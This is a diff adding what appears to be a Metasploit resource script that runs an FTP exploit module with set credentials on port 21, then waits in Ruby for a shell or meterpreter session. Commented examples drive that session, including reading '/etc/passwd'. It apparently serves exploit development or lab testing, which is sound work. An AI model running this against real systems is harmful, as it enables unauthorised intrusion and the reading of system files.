@@ -1,0 +1,38 @@
+# The module is copied to `modules/exploits/`, so don't change this
+use exploit/module
+
+set VERBOSE true
+
+set FTPUSER ftpuser
+set FTPPASS ftpuser
+
+set RPORT 21
+
+
+# Make sure everything is alright
+show options
+
+# this will execute the module and put any session in background
+run -z
+
+# This block of ruby code is useful to make sure a session is setup before
+# interacting with it. Feel free to update this code.
+<ruby>
+  print_status('Waiting a bit to make sure the session is completely setup...')
+  timeout = 10
+  loop do
+    break if (timeout == 0) || (framework.sessions.any? && framework.sessions.first[1].sys)
+    sleep 1
+    timeout -= 1
+  end
+  if framework.sessions.any? && framework.sessions.first[1].sys
+
+    # Here is where we can interact with the session (shell or meterpreter).
+    # The session number should be 1 at this point.
+    # e.g. (for a meterpreter session):
+    #run_single("sessions -i 1 -C 'pwd'")
+    #run_single("sessions -i 1 -C 'ls -lah'")
+    #run_single("sessions -i 1 -C 'cat /etc/passwd'")
+
+  end
+</ruby>
